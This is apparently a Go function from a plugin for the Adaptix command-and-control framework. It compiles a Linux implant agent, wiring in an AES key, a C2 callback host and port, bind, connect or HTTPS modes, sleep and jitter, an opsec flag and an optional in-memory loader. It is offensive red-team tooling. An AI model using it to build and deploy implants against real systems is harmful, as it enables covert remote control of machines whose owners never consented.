func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	modDir := ModuleDir
	var args map[string]any
	if profile.AgentConfig != "" {
		if err := json.Unmarshal([]byte(profile.AgentConfig), &args); err != nil {
			return nil, "", fmt.Errorf("linux agent: failed to parse agent config: %w", err)
		}
	}
	if args == nil {
		args = make(map[string]any)
	}

	arch    := getStr(args, "arch",     "x64")
	tcpMode := getStr(args, "tcp_mode", "bind (pivot — wait for parent)")
	inMem   := false
	if v, ok := args["inmem"].(bool); ok { inMem = v }
	outFormat := getStr(args, "format", "elf")
	opsec   := false
	if v, ok := args["opsec"].(bool); ok { opsec = v }
	sleepSec  := uint32(5)   // default 5s — spinner sends seconds
	jitterPct := uint32(0)
	if v, ok := args["sleep_ms"].(float64); ok && v >= 0 { sleepSec = uint32(v) }
	if v, ok := args["jitter_pct"].(float64); ok && v >= 0 && v <= 100 { jitterPct = uint32(v) }
	sleepMs := sleepSec * 1000  // convert to ms for NAX_SLEEP_MS

	aesKey           := "00000000000000000000000000000000"
	listenerBindPort := "4444"
	listenerC2Host   := ""
	listenerC2Port   := "4444"
	var callbackHosts []string
	if len(profile.ListenerProfiles) > 0 {
		var listenerCfg struct {
			EncryptKey     string   `json:"encrypt_key"`
			BindPort       any      `json:"bind_port"`
			PortBind       any      `json:"port_bind"`
			C2Host         string   `json:"c2_host"`
			C2Port         any      `json:"c2_port"`
			TcpMode        string   `json:"tcp_mode"`
			CallbacksHosts []string `json:"callbacks_hosts"`
		}
		if err := json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerCfg); err == nil {
			if listenerCfg.EncryptKey != "" { aesKey = listenerCfg.EncryptKey }
			switch v := listenerCfg.BindPort.(type) {
			case float64: listenerBindPort = fmt.Sprintf("%.0f", v)
			case string:  if v != "" { listenerBindPort = v }
			}
			// Use callbacks_hosts[0] as C2 host
			if listenerCfg.C2Host != "" {
				listenerC2Host = listenerCfg.C2Host
			} else if len(listenerCfg.CallbacksHosts) > 0 {
				h := listenerCfg.CallbacksHosts[0]
				// callbacks_hosts entry is "host:port" — split them
				if host, port, e2 := net.SplitHostPort(h); e2 == nil {
					listenerC2Host = host
					if port != "" { listenerC2Port = port }
				} else {
					// No port in string — use as-is
					listenerC2Host = h
				}
			}
			// Safety: strip any port that may have leaked into c2_host
			if host, port, e2 := net.SplitHostPort(listenerC2Host); e2 == nil {
				listenerC2Host = host
				if port != "" && listenerC2Port == "4444" { listenerC2Port = port }
			}
			callbackHosts = listenerCfg.CallbacksHosts
			if listenerCfg.TcpMode != "" { tcpMode = listenerCfg.TcpMode }
			switch v := listenerCfg.C2Port.(type) {
			case float64: listenerC2Port = fmt.Sprintf("%.0f", v)
			case string:  if v != "" { listenerC2Port = v }
			}
			// port_bind fallback (HTTPS listener uses port_bind, not c2_port)
			if listenerC2Port == "4444" {
				switch v := listenerCfg.PortBind.(type) {
				case float64: if v > 0 { listenerC2Port = fmt.Sprintf("%.0f", v) }
				case string:  if v != "" { listenerC2Port = v }
				}
			}
		}
	}

	wm        := "deadbeef"
	debugMode := getStr(args, "debug", "false")
	isBind    := strings.HasPrefix(tcpMode, "bind")
	isHttps   := strings.HasPrefix(tcpMode, "https")

	naxRoot, err := getNaxRoot(modDir)
	if err != nil {
		return nil, "", fmt.Errorf("linux agent: cannot find NAX root: %w", err)
	}
	srcDir := filepath.Join(naxRoot, "nax_linux")

	cc := "gcc"
	switch arch {
	case "arm64": cc = "aarch64-linux-gnu-gcc"
	}

	naxDebug := "0"
	if debugMode == "true" || debugMode == "1" { naxDebug = "1" }

	// Generate nax_config.h with volatile write macros
	if isHttps || !isBind {
		c2PortInt := 4444
		if p, err2 := strconv.Atoi(listenerC2Port); err2 == nil { c2PortInt = p }
		c2h := listenerC2Host
		if c2h == "" { c2h = "127.0.0.1" }
		if isHttps && c2h == "" { c2h = "127.0.0.1" }
		configH, err2 := generateNaxConfigH(aesKey, c2h, c2PortInt, callbackHosts)
		if err2 != nil {
			return nil, "", fmt.Errorf("linux agent: generateNaxConfigH: %w", err2)
		}
		configPath := filepath.Join(srcDir, "include", "nax_config.h")
		_ = os.WriteFile(configPath, configH, 0644)
	}

	makeArgs := []string{
		fmt.Sprintf("CC=%s", cc),
		fmt.Sprintf("NAX_AES_KEY=%s", aesKey),
		fmt.Sprintf("NAX_LISTENER_WM=0x%s", wm),
		fmt.Sprintf("NAX_DEBUG=%s", naxDebug),
	}

	if outFormat == "so" {
		makeArgs = append(makeArgs, "NAX_FORMAT=so")
	}
	if opsec {
		makeArgs = append(makeArgs, "NAX_OPSEC=1")
	}

	suffix := ""
	if isBind {
		makeArgs = append(makeArgs, "NAX_TCP_MODE=bind",
			fmt.Sprintf("NAX_BIND_PORT=%s", listenerBindPort))
		suffix = "_bind"
	} else if isHttps {
		// Locate OpenSSL headers for cross-compilation.
		// Native x64 uses /usr/include/openssl directly.
		// Cross targets need the multiarch path (e.g. /usr/include/aarch64-linux-gnu/openssl).
		if arch != "x64" {
			pkgArchMap := map[string]string{"arm64": "arm64"}
			pkgArch := pkgArchMap[arch]

			// Find opensslconf.h for target arch using dpkg -L or find
			findCmd := exec.Command("bash", "-c",
				fmt.Sprintf("dpkg -L libssl-dev:%s 2>/dev/null | grep opensslconf.h | head -1", pkgArch))
			foundPath, findErr := findCmd.Output()
			sslIncDir := ""
			if findErr == nil && len(foundPath) > 0 {
				// Extract the include directory (parent of openssl/)
				p := strings.TrimSpace(string(foundPath))
				sslIncDir = filepath.Dir(filepath.Dir(p))
			}
			if sslIncDir == "" {
				return nil, "", fmt.Errorf("HTTPS on %s requires OpenSSL cross-headers.\nInstall with:\n  sudo dpkg --add-architecture %s\n  sudo apt-get update\n  sudo apt-get install libssl-dev:%s", arch, pkgArch, pkgArch)
			}
			makeArgs = append(makeArgs, fmt.Sprintf("OPENSSL_INC=%s", sslIncDir))
		}
		c2h := listenerC2Host
		if c2h == "" { c2h = "127.0.0.1" }
		port := listenerC2Port
		if port == "" { port = "443" }
		makeArgs = append(makeArgs, "NAX_TCP_MODE=https",
			fmt.Sprintf("NAX_C2_HOST=%s", c2h),
			fmt.Sprintf("NAX_C2_PORT=%s", port),
			fmt.Sprintf("NAX_SLEEP_MS=%d", sleepMs),
			fmt.Sprintf("NAX_JITTER_PCT=%d", jitterPct))
		suffix = "_https"
	} else {
		c2h := listenerC2Host
		if c2h == "" { c2h = "127.0.0.1" }
		makeArgs = append(makeArgs, "NAX_TCP_MODE=connect",
			fmt.Sprintf("NAX_C2_HOST=%s", c2h),
			fmt.Sprintf("NAX_C2_PORT=%s", listenerC2Port))
	}

	cmd := exec.Command("make", makeArgs...)
	cmd.Dir = srcDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, "", fmt.Errorf("linux agent: build failed:\n%s", string(out))
	}

	debugSuffix := ""
	if naxDebug == "1" { debugSuffix = "_debug" }
	soSuffix := ""
	if outFormat == "so" { soSuffix = ".so" }
	binPath := filepath.Join(srcDir, "_bin", "nax_linux"+suffix+debugSuffix+soSuffix)
	data, err := os.ReadFile(binPath)
	if err != nil {
		return nil, "", fmt.Errorf("linux agent: binary not found after build: %w", err)
	}

	filename := fmt.Sprintf("nax_linux_%s%s%s%s", arch, suffix, debugSuffix, soSuffix)
	naxLogOk("BuildPayload: compiled %s (%d bytes)", filename, len(data))

	if !inMem {
		return data, filename, nil
	}

	loaderData, loaderName, loaderErr := buildInMemLoader(srcDir, cc, data, filename)
	if loaderErr != nil {
		naxLogErr("BuildPayload: in-memory loader build failed: %v", loaderErr)
		return nil, "", loaderErr
	}
	naxLogOk("BuildPayload: in-memory loader %s (%d bytes)", loaderName, len(loaderData))
	return loaderData, loaderName, nil
}

